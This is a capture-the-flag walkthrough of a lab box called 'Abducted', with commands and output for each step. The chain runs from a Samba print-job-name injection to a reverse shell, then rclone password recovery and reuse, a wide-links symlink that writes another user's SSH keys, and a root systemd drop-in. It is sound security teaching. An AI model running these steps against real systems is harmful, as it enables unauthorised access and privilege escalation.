The shape of it

Abducted is a tight Samba chain. Enumeration shows only SSH and SMB. Anonymous SMB listing exposes a printer share, HP-Reception, plus two disk shares. The printer is the first break: Samba's print subsystem is configured with print command = /usr/local/bin/printaudit %J %s, and vulnerable Samba versions pass the client-controlled job name into that command without escaping shell metacharacters.

Code execution lands as nobody. From there, a world-readable offsite backup configuration in /opt/offsite-backup/rclone.conf contains an rclone-obscured SFTP password. rclone reveal decodes it, and the password is reused for scott. Scott can write into a Samba share; the share is configured with force user = marcus, wide links = yes, and unix extensions = no, so a symlink created locally by Scott becomes a way to write Marcus-owned files through SMB. Marcus belongs to operators, which can manage the Samba service path through a group-writable systemd drop-in and polkit-authorized restart.

nmap → 22,139,445 └─ smbclient -L -N → HP-Reception printer └─ Samba CVE-2026-4480 → print job name |sh └─ reverse shell as nobody └─ /opt/offsite-backup/rclone.conf └─ rclone reveal → iXzvcib3SrpZ └─ SSH as scott → user.txt scott → /etc/samba/shares.conf └─ transfer share: force user = marcus + wide links = yes └─ ln -s /home/marcus /srv/transfer/mhome └─ SMB write → /home/marcus/.ssh/authorized_keys as marcus └─ SSH as marcus (operators) └─ /etc/systemd/system/smbd.service.d group writable └─ root-run ExecStartPre drop-in + restart smbd └─ root shell

02 · foothold
02

CVE-2026-4480 — print job name injection

The vulnerability is wonderfully direct. When a vulnerable Samba print job finishes spooling, Samba substitutes the job name into the configured print command via %J. On this host, %J reaches a shell as the first argument to printaudit. A document name of |sh turns the spool file itself into the script body.

# listener
nc -lvnp 4445

# exploit
python3 cve-2026-4480.py 10.129.37.208 10.10.17.69 4445 -P HP-Reception
[*] target : 10.129.37.208 (\\10.129.37.208\HP-Reception) [+] print job submitted -- check your listener Connection received on 10.129.37.208 nobody@abducted:/var/spool/samba$ id uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
Why the payload is in the body

The job name supplies |sh; Samba then executes a command line where the spool file path is also substituted. The spool content becomes the shell script that sh reads.

Rclone reveal to Scott

The nobody shell could read the offsite backup config and cron entry. The password was not encrypted in a password-manager sense; it was rclone's reversible obscured format.

cat /opt/offsite-backup/rclone.conf
rclone reveal 'HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw'
[offsite] type = sftp host = backup.hartley-group.internal user = svc-backup pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw rclone reveal iXzvcib3SrpZ

The decoded password was reused for the system account scott:

Wide links and force user

Scott can read the Samba configuration. The transfer share is the pivot point: it is valid for Scott, forces file operations to Marcus, and allows wide links while Unix extensions are disabled globally.

cat /etc/samba/smb.conf /etc/samba/shares.conf
[global] unix extensions = no allow insecure wide links = yes [transfer] path = /srv/transfer valid users = scott force user = marcus read only = no wide links = yes

Locally, Scott can create a symlink inside the share root. Over SMB, that link resolves outside the share and file writes are performed as Marcus.

ssh-keygen -t ed25519 -f marcus_ed25519 -N ''
ssh scott@10.129.37.208 'ln -s /home/marcus /srv/transfer/mhome'
smbclient //10.129.37.208/transfer -U 'scott%iXzvcib3SrpZ'
smb: \> mkdir mhome/.ssh
smb: \> put marcus_ed25519.pub mhome/.ssh/authorized_keys
ssh -i marcus_ed25519 marcus@10.129.37.208 uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
05 · privilege escalation
05

Operators, systemd, and smbd

Marcus belongs to operators. The useful filesystem delegation is small but decisive: /etc/systemd/system/smbd.service.d is group-writable by operators. A drop-in in that directory becomes part of the root-owned Samba service definition after systemctl daemon-reload. The restart path was authorized through polkit for this delegated service-management role.

drwxrws--- 2 root operators 4096 /etc/systemd/system/smbd.service.d uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)

For a minimal proof, I used ExecStartPre to copy root's flag to a Marcus-readable location. Then I replaced that with an authorized key write to get a real root SSH shell.

cat > /etc/systemd/system/smbd.service.d/zz-root.conf <<'EOF'
[Service]
ExecStartPre=/bin/bash -c 'mkdir -p /root/.ssh; echo "ssh-ed25519 AAAA..." >> /root/.ssh/authorized_keys; chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys'
EOF

systemctl daemon-reload --no-ask-password
systemctl restart smbd --no-ask-password
ssh -i root_ed25519 root@10.129.37.208 'id; cat /root/root.txt'
uid=0(root) gid=0(root) groups=0(root) abducted a6b3a7447178865dd5d24fd4144d70da

dead ends that paid rent
Wrong VPN. The first scan showed every expected port filtered because the old pro-lab VPN was still active. Swapping to machines_eu-dedivip-3.ovpn made the box reachable immediately.
Anonymous disk shares. Guest listing was allowed, but disk share access was not. The printer share was the real anonymous write path.
SMB permission labels. smbmap reported transfer as read-only for Scott, but the wide-link/force-user path still allowed useful writes once the symlink existed in the share root.
07 · notes

Takeaways

01
Printer shares are command surfaces
A printer share is not harmless when backend commands interpolate client-controlled job metadata.
02
Rclone passwords are recoverable
Rclone's pass value is obscured, not one-way encrypted. rclone reveal is the intended decoder.
03
Samba options compose
force user, wide links, and disabled Unix extensions become an identity-shifting write primitive.
04
Group-writable drop-ins are root code
If a delegated group can write service drop-ins and restart the service, every root-run service directive is in scope.
